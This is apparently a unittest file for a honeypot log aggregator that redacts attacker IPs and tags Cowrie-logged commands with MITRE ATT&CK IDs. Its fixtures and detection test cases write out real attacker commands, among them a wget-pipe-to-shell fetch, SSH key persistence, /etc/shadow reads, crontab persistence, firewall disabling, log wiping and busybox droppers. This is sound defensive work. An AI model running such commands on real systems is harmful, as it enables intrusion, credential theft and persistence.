"""Tests for vps/aggregate.py. Run: python3 -m unittest discover -s tests

All IPs below are from documentation ranges (RFC 5737), never real hosts.
"""

import argparse
import datetime
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "vps"))
import aggregate  # noqa: E402

HONEYPOT_IP = "203.0.113.10"
NOW = datetime.datetime(2026, 11, 2, 3, 30, tzinfo=datetime.timezone.utc)


class FakeReader:
    """Stands in for maxminddb: same record shape as DB-IP Lite City."""
    DB = {
        "198.51.100.7": {"country": {"iso_code": "BR"}, "city": {"names": {"en": "S\u00e3o Paulo"}},
                         "location": {"latitude": -23.5475123, "longitude": -46.6361234}},
        "198.51.100.8": {"country": {"iso_code": "VN"}},
    }

    def get(self, ip):
        return self.DB.get(ip)


def ev(eventid, ts, **kw):
    return json.dumps({"eventid": eventid, "timestamp": ts, **kw})


DAY1 = [
    ev("cowrie.session.connect", "2026-11-01T01:00:00.000Z", src_ip="198.51.100.7", protocol="ssh"),
    ev("cowrie.client.version", "2026-11-01T01:00:01.000Z", src_ip="198.51.100.7", version="SSH-2.0-Go"),
    ev("cowrie.login.failed", "2026-11-01T01:00:02.000Z", src_ip="198.51.100.7", username="root", password="123456"),
    ev("cowrie.login.success", "2026-11-01T01:00:03.000Z", src_ip="198.51.100.7", username="root", password="admin"),
    ev("cowrie.command.input", "2026-11-01T01:00:04.000Z", src_ip="198.51.100.7",
       input=f"cd /tmp; wget http://192.0.2.55/x.sh -O- | sh # {HONEYPOT_IP}"),
    ev("cowrie.session.file_download", "2026-11-01T01:00:05.000Z", src_ip="198.51.100.7",
       url="http://192.0.2.55/x.sh", shasum="ab" * 32),
    "not json at all",
    ev("cowrie.session.connect", "2026-11-01T02:00:00.000Z", src_ip="198.51.100.8", protocol="telnet"),
    ev("cowrie.login.failed", "2026-11-01T02:00:01.000Z", src_ip="198.51.100.8",
       username="admin\x1b[31m", password="x" * 300),
]
LIVE = [
    ev("cowrie.session.connect", "2026-11-02T03:00:00.000Z", src_ip="198.51.100.7", protocol="ssh"),
    ev("cowrie.login.failed", "2026-11-02T03:00:01.000Z", src_ip="198.51.100.7", username="root", password="123456"),
    ev("cowrie.session.connect", "2026-11-02T03:00:00.000Z", src_ip="198.51.100.99", protocol="ssh"),
]


class AggregateTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        d = self.tmp.name
        self.logs, self.state, self.out = (os.path.join(d, x) for x in ("logs", "state", "stats.json"))
        os.makedirs(self.logs)
        self.write("cowrie.json.2026-11-01", DAY1)
        self.write("cowrie.json", LIVE)

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, name, lines):
        with open(os.path.join(self.logs, name), "w") as fh:
            fh.write("\n".join(lines) + "\n")

    def run_agg(self):
        aggregate.main(["--logs", self.logs, "--state", self.state, "--out", self.out,
                        "--redact", HONEYPOT_IP, "--exclude-ip", "198.51.100.99"])
        with open(self.out) as fh:
            raw = fh.read()
        return raw, json.loads(raw)

    def test_totals(self):
        _, s = self.run_agg()
        t = s["totals"]
        self.assertEqual(t["sessions"], 3)           # .99 is excluded
        self.assertEqual(t["unique_sources"], 2)
        self.assertEqual(t["login_attempts"], 4)
        self.assertEqual(t["logins_accepted"], 1)
        self.assertEqual(t["telnet_sessions"], 1)
        self.assertEqual([d["day"] for d in s["daily"]], ["2026-11-01", "2026-11-02"])
        self.assertEqual(s["top"]["passwords"][0], {"value": "123456", "count": 2})

    def test_nothing_private_or_live_is_published(self):
        raw, s = self.run_agg()
        for needle in ("198.51.100", HONEYPOT_IP, "192.0.2.55", "http://", "\x1b"):
            self.assertNotIn(needle, raw)
        self.assertIn("[honeypot-ip]", raw)
        self.assertIn("hxxp[:]//192[.]0[.]2[.]55/x.sh", raw)
        self.assertTrue(all(len(p["value"]) <= aggregate.MAX_LEN for p in s["top"]["passwords"]))

    def test_rerun_does_not_double_count(self):
        self.run_agg()
        _, s = self.run_agg()
        self.assertEqual(s["totals"]["sessions"], 3)

    def test_history_survives_raw_log_cleanup(self):
        self.run_agg()
        os.remove(os.path.join(self.logs, "cowrie.json.2026-11-01"))
        _, s = self.run_agg()
        self.assertEqual(s["totals"]["sessions"], 3)
        self.assertEqual(s["downloads"][0]["sha256"], "ab" * 32)

    def run_geo(self):
        recent = os.path.join(self.tmp.name, "recent.json")
        a = argparse.Namespace(logs=self.logs, state=self.state, out=self.out, recent_out=recent,
                               redact=[HONEYPOT_IP], exclude_ip=["198.51.100.99"])
        aggregate.run(a, aggregate.Geo(reader=FakeReader()), NOW)
        with open(self.out) as fh:
            stats = json.load(fh)
        with open(recent) as fh:
            raw = fh.read()
        return stats, raw, json.loads(raw)

    def test_countries(self):
        stats, _, _ = self.run_geo()
        self.assertEqual(stats["countries"], {"BR": 2, "VN": 1})

    def test_recent_window_and_privacy(self):
        _, raw, r = self.run_geo()
        # only the live file's events fall in the hour before NOW
        self.assertEqual([e["kind"] for e in r["events"]], ["connect", "login"])
        e = r["events"][0]
        self.assertEqual((e["cc"], e["city"], e["lat"], e["lon"]), ("BR", "S\u00e3o Paulo", -23.5, -46.6))
        self.assertEqual(r["events"][1]["text"], "root / 123456")
        self.assertNotIn("198.51.100", raw)
        self.assertNotIn("src_ip", raw)

    def test_recent_spans_midnight_rotation(self):
        self.write("cowrie.json.2026-11-01", DAY1 + [
            ev("cowrie.session.connect", "2026-11-02T02:59:00.000Z", src_ip="198.51.100.8", protocol="telnet")])
        os.utime(os.path.join(self.logs, "cowrie.json.2026-11-01"), (NOW.timestamp(), NOW.timestamp()))
        _, _, r = self.run_geo()
        self.assertEqual([e["kind"] for e in r["events"]], ["connect", "connect", "login"])

    def test_escaped_control_bytes(self):
        self.assertEqual(aggregate.clean("enable\\x00", []), "enable")
        self.assertEqual(aggregate.clean("a\\x1bb", []), "a b")
        self.assertEqual(aggregate.clean("keep \\x41", []), "keep \\x41")

    def test_ttps_once_per_session(self):
        _, s = self.run_agg()
        got = {t["id"]: t["sessions"] for t in s["ttps"]}
        # DAY1 has no session ids, so everything shares one (None) session per day
        self.assertEqual(got["T1110.001"], 2)   # one per day
        self.assertEqual(got["T1078"], 1)
        self.assertEqual(got["T1105"], 1)       # wget command + file_download, same session
        self.assertEqual(got["T1059.004"], 1)   # | sh
        self.assertEqual(s["ttps"][0]["tactic"], "Credential Access")

    def test_empty(self):
        os.remove(os.path.join(self.logs, "cowrie.json.2026-11-01"))
        os.remove(os.path.join(self.logs, "cowrie.json"))
        _, s = self.run_agg()
        self.assertEqual(s["totals"]["sessions"], 0)
        self.assertIsNone(s["first_day"])


class TagTest(unittest.TestCase):
    CASES = {
        "uname -a": {"T1082"},
        "cat /proc/cpuinfo | grep name | wc -l": {"T1082"},
        "whoami": {"T1033"},
        "cd /tmp; id": {"T1033"},
        "ps aux": {"T1057"},
        "ifconfig; ip a": {"T1016"},
        "ls -la /var/run": {"T1083"},
        "cat /etc/passwd": {"T1087.001"},
        "cat /etc/shadow": {"T1003.008"},
        "curl -s hxxp[:]//x/y -o y; chmod +x y; ./y.sh": {"T1105", "T1222.002", "T1059.004"},
        "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys; chattr +i ~/.ssh/authorized_keys": {"T1098.004", "T1222.002"},
        "(crontab -l; echo '* * * * * /tmp/x') | crontab -": {"T1053.003"},
        "echo root:pass|chpasswd": {"T1098"},
        "rm -rf /tmp/*; history -c": {"T1070.004", "T1070.003"},
        "systemctl stop firewalld; ufw disable": {"T1562.001"},
        "./XMRig --url stratum+tcp://pool": {"T1496"},
        "echo /dev/tcp/1/2": {"T1105"},
        # Mirai-style IoT bots
        "enable": {"T1059.008"},
        " shell ": {"T1059.008"},
        "sh": {"T1059.008"},
        "ping ;sh": {"T1059.004"},
        "/bin/busybox echo > /dev/shm/.b && sh /dev/shm/.b && cd /dev/shm/": {"T1059.004"},
        "sh .k": {"T1059.004"},
        '/bin/busybox echo -ne "\\x7f\\x45\\x4c\\x46\\x01" >> .d': {"T1105", "T1027"},
    }
    NONE = ["ls" + "x", "echo hello", "enable the thing", "systemd", "shellcheck x", "cat /etc/issue", "stop",
            "laptop", "identity", "rmdir x", "free", "/bin/busybox UNSTABLE", 'echo -ne "\\x41" > a',
            "sha256sum x", "finish"]

    def test_patterns(self):
        for cmd, want in self.CASES.items():
            self.assertEqual(aggregate.tag("cowrie.command.input", cmd), want, cmd)

    def test_no_false_tags(self):
        for cmd in self.NONE:
            self.assertEqual(aggregate.tag("cowrie.command.input", cmd), set(), cmd)

    def test_event_rules(self):
        self.assertEqual(aggregate.tag("cowrie.login.failed"), {"T1110.001"})
        self.assertEqual(aggregate.tag("cowrie.session.connect"), set())

    def test_rules_file_is_well_formed(self):
        with open(aggregate.RULES_FILE) as fh:
            rules = json.load(fh)["rules"]
        for r in rules:
            self.assertRegex(r["id"], r"^T\d{4}(\.\d{3})?$")
            self.assertTrue(r["name"] and r["tactic"])
            self.assertEqual(("event" in r) + ("pattern" in r), 1, r["id"])
            # (?i) only at the start, so Python and PCRE read it the same way
            self.assertNotIn("(?i)", r.get("pattern", "")[4:])


if __name__ == "__main__":
    unittest.main()
